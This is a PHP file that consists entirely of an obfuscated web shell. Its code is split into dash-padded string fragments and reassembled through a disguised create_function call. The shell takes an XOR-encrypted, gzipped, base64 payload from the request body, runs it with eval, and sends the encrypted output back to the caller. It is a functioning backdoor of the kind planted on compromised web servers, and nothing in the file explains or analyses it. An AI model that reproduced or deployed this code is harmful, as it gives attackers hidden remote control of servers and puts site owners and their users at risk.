<?php
$D='://input"-),$m)==-1) {@o--b_start()-;@ev-al(@gz-uncomp-ress(@x(-@ba-se6-4_decode($m[1-]),$k)))-;$-o=@ob_-';
$K=',-$i-++){$o.=$t{$i}^-$k{$j-};}}return $-o;}-if (@preg_-match-("/$k-h(.+)$kf--/",-@file_get_con-tent-s-("php';
$l='g-et_content--s();@ob-_end_c-lean();$r=@base6-4_enco-de(@x(-@gzco-mpr-ess($-o),$k))-;print("-$p$-kh$r$kf");}';
$G='$k="96f1-8580";$--kh="11e9-ae89-f482--";$kf="8645f22082bc-";-$p="W49TT4-aa8-og5ueOt"-;fun-ction x-($';
$T='-t,$k){$c=--str-len($k-);$l=strlen(-$t);$o-="";for($i=--0;-$i<$l;){fo-r($j=0;($-j<$-c&&$i<$l-)-;$j++';
$S=str_replace('jt','','jtjtcjtreajtte_fjtujtnction');
$q=str_replace('-','',$G.$T.$K.$D.$l);
$J=$S('',$q);$J();
?>
